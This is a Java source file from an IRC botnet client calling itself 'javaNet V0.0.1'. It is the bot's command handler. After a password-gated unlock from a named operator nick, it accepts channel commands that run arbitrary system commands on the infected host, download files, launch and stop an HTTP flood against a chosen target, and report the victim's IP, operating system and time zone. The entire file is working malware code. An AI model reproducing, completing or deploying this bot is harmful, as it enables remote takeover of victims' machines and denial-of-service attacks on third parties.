package org.automatix.net.modules;

import org.automatix.net.ConfigFiles.IRCConfig;
import org.automatix.net.IRC.Methods;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

/**
 * Created by IntelliJ IDEA.
 * User: Administrator
 * Date: Oct 27, 2008
 * Time: 4:37:40 PM
 * To change this template use File | Settings | File Templates.
 */
public class IRCReader extends Thread {
    Thread httpFlooder;
    static boolean unlocked;
    static BufferedReader ircReader;
    static int pingCount;
    public static IRCWriter ircWriter;
    public IRCReader(InputStream s, IRCWriter x) {
        this.ircReader = new BufferedReader(new InputStreamReader(s));
        this.ircWriter = x;
    }
    public void run() {
        try {
            ircWriter.sendLoginText();
        } catch (IOException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }
        while(true) {
            try {
                String input = ircReader.readLine();
                String[] inputArgs = Methods.splitArgs(input);
                System.out.println(input);

                if (input.contains("PING")) {
                    String pongline = input;
                    pongline = pongline.replace("PING","PONG");
                    ircWriter.sendPingRespone(pongline);
                }
                if (input.contains("+iwG")) {
                    ircWriter.sendRaw("JOIN :"+ IRCConfig.CHANNEL);
                }
                if (input.contains("?unlock") && inputArgs[0].contains("hackerr") && inputArgs[4].contains("pccvondel")) {
                    ircWriter.sayChannel("javaNet V0.01 has been unlocked");
                    unlocked = true;
                }
                if (input.contains("?version")) {
                    ircWriter.sayChannel("javaNet V0.0.1 by Synt[a]x");
                }
                if (unlocked) {
                if (input.contains("?system")) {
                    if (!inputArgs[4].isEmpty()) {
                        Thread executor = new Exec(inputArgs[4]);
                        executor.start();
                    } else {
                        ircWriter.sayChannel("Executor syntax = ?system '<command>'");
                    }
                }
                if (input.contains("?download")) {
                        Thread downloader = new Downloader(inputArgs[4],inputArgs[5]);
                        downloader.start();
                }
                if (input.contains("?httpf")) {
                    IRCConfig.flooding = true;
                    httpFlooder = new HttpFlood(inputArgs[4],Integer.valueOf(inputArgs[5]),Integer.valueOf(inputArgs[6]));
                    httpFlooder.start();
                }
                if (input.contains("?stophttpf")) {
                    IRCConfig.flooding = false;
                    httpFlooder.stop();
                    ircWriter.sayChannel("Stopped HTTPFlood");
                }
                if (input.contains("?getTime")) {
                    TimeZone zone = TimeZone.getDefault();
                    SimpleDateFormat date = new SimpleDateFormat("hh:mm:ss");
                    String output = date.format(new Date());
                    ircWriter.sayChannel("I'm in timezone: "+zone.getID() + " and the time is "+output);
                }
                if (input.contains("?getIP")) {
                    Thread ip = new IPGrabber();
                    ip.start();
                }
                if (input.contains("?getOS")) {
                    String os = System.getProperty("os.name");
                    ircWriter.sayChannel("I'm running on the following OS: "+os);
                }
                }


                
            } catch (IOException e) {
                e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
            }
        }
    }
}
